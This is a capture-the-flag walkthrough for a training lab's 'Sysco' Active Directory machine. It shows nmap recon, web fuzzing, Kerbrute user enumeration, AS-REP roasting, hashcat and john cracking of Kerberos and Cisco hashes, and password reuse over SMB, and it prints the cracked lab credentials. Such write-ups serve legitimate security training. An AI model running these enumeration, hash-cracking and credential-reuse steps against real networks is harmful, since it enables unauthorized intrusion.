---
title: "Sysco Walkthrough"
date: 2025-11-01 00:00:00 +00:00
categories: [Hack Smarter]
tags: [HackSmarter]
permalink: /2025/11/01/post-title/
description: "Sysco - Medium rated Active Directory Machine by Luis M."
published: true
---

# Scenario 
> Sysco is a managed service provider that engaged us to perform an external penetration test against their Active Directory environment. From an external vantage, the assessment simulates a realistic, determined adversary: enumerate public-facing services and web assets to harvest usernames, gain an initial foothold, move laterally through the network, and escalate privileges to achieve Domain Administrator access. Because EDR/AV is present, the engagement emphasizes livingâ€‘offâ€‘theâ€‘land techniques and lowâ€‘noise operations while thoroughly documenting findings and artifacts.
- Machine URL: https://www.hacksmarter.org/events/4fff8db5-5c65-4d02-bca8-1e7984ae1f2f

![Initial](/assets/images/sysco.png)


## Recon
### Initial Nmap Scan



- I ran Rustscan & Autorecon 

```go
nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/home/kali/Documents/Obsidian/HackSmarter/Sysco/External/enum/results/10.1.43.102/scans/_full_tcp_nmap.txt" -oX "/home/kali/Documents/Obsidian/HackSmarter/Sysco/External/enum/results/10.1.43.102/scans/xml/_full_tcp_nmap.xml" $IP

Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-30 20:39 EDT
Nmap scan report for sysco.local (10.1.43.102)
Host is up (0.026s latency).

53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)
|_http-title: Index - Sysco MSP
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-favicon: Unknown favicon MD5: DD229045B1B32B2F2407609235A23238
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-10-31 01:08:15Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: SYSCO.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: SYSCO.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
|_ssl-date: 2025-10-31T01:09:58+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.SYSCO.LOCAL
| Issuer: commonName=DC01.SYSCO.LOCAL
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-17T05:14:51
| Not valid after:  2026-04-18T05:14:51
| MD5:   fdbb:6553:3042:be9f:3c1d:15b2:60db:5e1f
| SHA-1: 017c:b073:a3a7:1843:0ffd:7a2b:184a:c07b:a830:c0a8
| rdp-ntlm-info: 
|   Target_Name: SYSCO
|   NetBIOS_Domain_Name: SYSCO
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SYSCO.LOCAL
|   DNS_Computer_Name: DC01.SYSCO.LOCAL
|   DNS_Tree_Name: SYSCO.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-10-31T01:09:18+00:00
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49683/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49743/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49808/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
```
Key info from this: 
- DNS_DOMAIN_NAME: SYSCO.LOCAL
- DNS_Computer_Name: DC01.SYSCO.LOCAL
- **Note on Kerberos timing:** If you're planning any Kerberos-based attacks, keep in mind that Kerberos is extremely time-sensitive. A time difference of more than ~5 minutes between your machine and the target server will cause authentication to fail. This is a security feature designed to prevent replay attacks, so make sure your system clock is synchronized before attempting any Kerberos exploits.
)

```zsh
sudo ntpdate <$target IP>
```


### Port 80 - HTTP 

### Site Crawling: 

![Visiting Site](/assets/images/SyscoMSP.png)
*Index.html* 

![Team](/assets/images/Team.png)
*Employees + Roles (possible userlist)*

- Based on the roles and assumed permissions of each role, we will likely need to pivot in this order 

1. Sarah Johnson â€” Sales Rep âšª  
   - Likely low-privilege user; good initial target for credential harvesting or phishing.

2. Jack Downland â€” Helpdesk Associate âšª  
   - Low-to-mid privileges; may have access to shared assets useful for lateral movement.

3. Lainey Moore â€” Systems Engineer ðŸ”¶  
   - Elevated permissions; potential access to servers, stacks, or service accounts.

4. Greg Shields â€” System Administrator ðŸ”’  
   - High-value target (possible domain or local admin). Final escalation objective once foothold/lateral movement is achieved.

> Mapping the users like this help map outbound relations and shortest paths to highâ€‘value principals once we ingest data to Bloodhound.

#### Directory Fuzzing
```zsh
ffuf -u http://sysco.local/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -ic -c
```
![FFUF](/assets/images/Ffuf.png)
*FFUF Output*
- we see a `301` for RoundCube. 

I also did vhost fuzzing on `SYSCO.LOCAL` but got nothing.

There is also a `roundcube` instance running on /roundcube

![RoundCube](/assets/images/Roundcube%20webmail.png)

- Checked source code for version, but none. From OSCP prep... I know 1.6.10 < is vuln to RCE.

## Port 88 - Kerberoasting 

#### Create a Userlist 

[Username-anarchy](https://github.com/urbanadventurer/username-anarchy) can be used for this and usually my go-to but.. AI.

```txt
Greg Shields
Sarah Johnson
Jack Dowland
Lainey Moore
```

![Lazy](/assets/images/promptengineering.png)

### Spray these users against the domain with [Kerbrute](https://github.com/ropnop/kerbrute)

```zsh
./kerbrute_linux_amd64 userenum -d sysco.local --dc $IP /home/kali/Documents/Obsidian/HackSmarter/Sysco/External/Users.txt
```
![Kerbrute](/assets/images/Kerbrute.png)

- Valid usernames found + we have a user we were able to get an Asreproast on `jack.dowland` 

![Denzel](/assets/images/denzel.gif)

### Saving Hash & Cracking

```bash
echo '$krb5asrep' >> hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

- That hash did not want to crack so I used `nxc` to re-dump.

```zsh
nxc ldap $IP -u 'jack.dowland' -p '' --asreproast out.txt
```

![asreproast](/assets/images/asreproast.png)

Got a password of `musicman1` lul.

So first set of creds = 

> jack.dowland:musicman1

![creds](/assets/images/giphy.gif)

## Foothold

Validating creds with SMB

```zsh
nxc smb $IP -u 'jack.dowland' -p 'musicman1' 
```
![SMB](/assets/images/SMBValidate.png)

With creds, we can attempt to login to that roundcube instance on port 80.

- I also run Bloodhound beforehand because why not


### RoundCube 

I was able to login with those creds to the Roundcube Webmail instance. 
- Inbox was empty
- I was able to get version under `About` 
- Sent mail shows Jack sent a router configuration 

![RoundcubeVersion](/assets/images/Roundcube%20Version.png)
*Version*

![RoundcubeSent](/assets/images/SentMail.png)
*Sent mail* 

![RouterCfg](/assets/images/Routercfg.png)
*Router config*

- We know Lainey is a systems engineer and seems to be Jack's boss

- In the cfg, we see Cisco Type 5 Hash

### Cracking Cisco Type 5 Hash

```zsh
echo `$1$` >> cisco.hash
hashcat -m 500 cisco.hash /usr/share/wordlists/rockyou.txt
hashcat -m 500 cisco.hash --show

$1$mERr$isugnYiHsjHT.i.tc2GDY.:Chocolate1
```

- So we have the password that Lainey set up. Human nature tells us to test his habits and see if this password works with his account

```zsh
nxc smb $IP -u 'lainey.moore' -p 'Chocolate1' 
```

